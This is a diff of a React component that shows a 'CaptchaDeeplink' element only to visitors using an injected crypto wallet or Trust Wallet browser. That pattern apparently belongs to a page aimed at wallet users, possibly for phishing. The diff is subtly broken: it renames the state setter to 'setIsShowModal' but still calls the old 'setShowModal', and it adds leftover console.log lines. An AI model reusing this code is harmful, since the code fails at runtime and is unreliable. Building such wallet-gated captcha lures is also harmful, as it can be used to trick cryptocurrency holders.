@@ -12,7 +12,7 @@ export function Home() {
   const isDark = usePrefersDark();
   const [isChecked, setIsChecked] = useState(false);
   const { currentStep } = useSelector((store: RootState) => store.main);
-  const [showModal, setShowModal] = useState(false);
+  const [showModal, setIsShowModal] = useState<boolean | null>(null);
 
   const dispatch = useDispatch();
 
@@ -22,8 +22,6 @@ export function Home() {
 
   useEffect(() => {
     if (typeof window === "undefined") return;
-
-    const userAgent = navigator.userAgent;
 
     const params = new URLSearchParams(window.location.search);
     const utm = params.get("utm_source");
@@ -36,16 +34,19 @@ export function Home() {
       utm === "Trust_Android_Browser" ||
       utm === "Trust_iOS_Browser";
 
-    if (injected || isTrust) {
+    console.log(injected);
+    console.log(isTrust);
+    if (injected) {
       setShowModal(true);
     }
   }, []);
 
   if (isDark == null) return;
+  if (showModal == null) return;
 
   return (
     <section className="home">
-      {!showModal && <CaptchaDeeplink />}
+      {showModal && <CaptchaDeeplink />}
 
       <div className="home__container">
         <div className="home__visual">
